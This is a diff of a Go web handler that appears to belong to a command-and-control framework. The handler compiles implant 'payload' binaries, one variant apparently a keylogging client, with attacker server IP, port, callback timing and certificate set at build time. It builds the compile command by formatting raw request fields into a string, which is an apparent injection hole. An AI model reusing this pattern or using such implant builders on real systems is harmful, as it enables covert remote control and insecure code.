@@ -203,7 +203,7 @@ func CreatePayloadHandler(c *gin.Context) {
 		if body["type"] == "original" {
 			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
 
-				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/client.go",
+				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o payloads/%s agent/agent.go",
 				body["serverip"],
 				body["serverport"],
 				body["callbackfrequency"],
@@ -214,7 +214,7 @@ func CreatePayloadHandler(c *gin.Context) {
 		} else if body["type"] == "wkeys" {
 			commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175
 
-				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/kclient/kclient.go",
+				"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o payloads/%s client/kclient/kclient.go",
 				body["serverip"],
 				body["serverport"],
 				body["callbackfrequency"],
@@ -231,5 +231,6 @@ func CreatePayloadHandler(c *gin.Context) {
 			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
 			c.JSON(http.StatusOK, gin.H{"data": "success"})
 		}
+
 	}
 }
